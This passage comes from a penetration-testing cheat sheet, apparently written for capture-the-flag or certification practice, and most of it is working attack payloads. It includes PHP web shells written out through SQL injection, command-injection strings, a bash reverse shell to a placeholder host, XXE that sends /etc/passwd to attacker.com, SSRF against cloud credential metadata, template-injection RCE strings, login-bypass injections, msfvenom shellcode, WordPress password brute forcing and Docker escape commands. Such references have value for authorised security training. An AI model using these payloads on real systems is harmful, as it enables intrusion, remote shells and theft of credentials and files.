/uploads/ /images/ /assets/ /files/ /media/
```

### 9.2 SQL Injection to RCE

```sql
# MySQL file write
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

# PostgreSQL command execution (superuser)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'

# MSSQL xp_cmdshell
EXEC xp_cmdshell 'whoami'
```

### 9.3 Command Injection to RCE

```bash
# Basic command injection
; whoami
| whoami
` whoami `
$(whoami)

# Reverse shell via command injection
; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

---

## 10 Advanced Web Attacks

### 10.1 XXE to RCE

```xml
# Out-of-band XXE 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

# evil.dtd 
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

### 10.2 SSRF to RCE

```bash
# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal service access
curl http://127.0.0.1:22
curl http://127.0.0.1:3306
```

### 10.3 SSTI to RCE

```python
# Jinja2 (Python)
{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip() }}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## 11 Authentication Bypass Techniques

### 11.1 SQL Injection Bypass

```sql
' OR '1'='1'--
' OR 1=1--
admin'--
' UNION SELECT 1,'admin','password'--
```

### 11.2 Header Manipulation

```bash
# X-Forwarded-For bypass
curl -H "X-Forwarded-For: 127.0.0.1" http://target/admin

# Host header injection
curl -H "Host: localhost" http://target/

# JWT token manipulation
# Use jwt_tool to test for vulnerabilities
python3 jwt_tool.py <JWT_TOKEN>
```

---

## 12 Buffer Overflow Exploitation

### 12.1 Basic Methodology

```bash
# Fuzzing
python3 fuzzer.py <RHOST> <RPORT>

# Pattern creation
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

# Pattern offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_VALUE>

# Bad character analysis
# Test: \x00\x0a\x0d\x25\x26\x2b\x3d

# Shellcode generation
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f c -a x86 -b "\x00\x0a\x0d"

# Exploit structure
[Buffer Overflow] + [EIP Overwrite] + [NOP Sled] + [Shellcode]
```

---

## 13 Common Exploitation Scenarios

### 13.1 WordPress Exploitation

```bash
# Plugin vulnerabilities
wpscan --url http://target --enumerate vp

# Theme vulnerabilities
wpscan --url http://target --enumerate vt

# User enumeration
wpscan --url http://target --enumerate u

# Password brute force
wpscan --url http://target -U admin -P /usr/share/wordlists/rockyou.txt
```

### 13.2 Jenkins Exploitation

```bash
# Check for unauthenticated access
curl http://target:8080/

# Groovy script execution
# Script console: http://target:8080/script
def cmd = "whoami".execute().text
```

### 13.3 Docker Escape

```bash
# Check for privileged container
cat /proc/1/cgroup
ls -la /host

# Docker socket access
docker run -v /:/host -it alpine chroot /host

# Privileged container escape
docker run --rm -it --privileged --pid=host alpine:latest nsenter -t 1 -m -u -n -i sh
```

---

## 14 Documentation Standards

### 14.1 Evidence Collection

```bash
# Screenshot important findings
# Save command output to files
# Document IP addresses and ports
# Record timestamps

# Use screen command for session logging
screen -L -Logfile session.log
```

### 14.2 Screenshot Requirements

```bash
# Web pages with vulnerabilities
# Command execution proof
# Privilege escalation steps
# Final proof (root.txt/flag.txt)
```

### 14.3 Command History Logging

```bash
# Enable bash history logging
export HISTTIMEFORMAT="%d/%m/%y %T "
export PROMPT_COMMAND='history -a'

# Save important commands to file
echo "command_here" >> commands_used.txt
```

---

## 15 Troubleshooting Common Issues

### 15.1 Reverse Shell Not Connecting

```bash
# Check firewall rules
# Verify IP address and port
# Test with simple netcat connection
# Check for outbound restrictions
```

### 15.2 File Upload Restrictions

```bash
# Try different extensions
# Test content-type bypass
# Use polyglot files
# Check file size limits
```

### 15.3 Privilege Escalation Blocked

```bash
# Check SELinux/AppArmor status
# Look for alternative escalation paths
# Check for file permissions
# Look for cron jobs/scheduled tasks
```

---

## Quick Win Checks

### Immediate Tests (5-10 minutes):

```bash
# Check for default credentials
# Test for anonymous FTP
# Check SMB shares with null session
# Look for exposed .git directories
# Test for LFI with /etc/passwd
# Check for backup files (.bak, .old)
# Test for PHP info disclosure
# Check for exposed admin panels
```

### Medium Effort (15-30 minutes):

```bash
# Directory brute forcing
# Parameter fuzzing
# SQL injection testing
# Command injection testing
# File upload testing
# Subdomain enumeration
```

### Comprehensive (1+ hours):

```bash
# Full port scanning
# Vulnerability scanning
# Manual code review (if source available)
# Authentication bypass testing
# Business logic testing
```
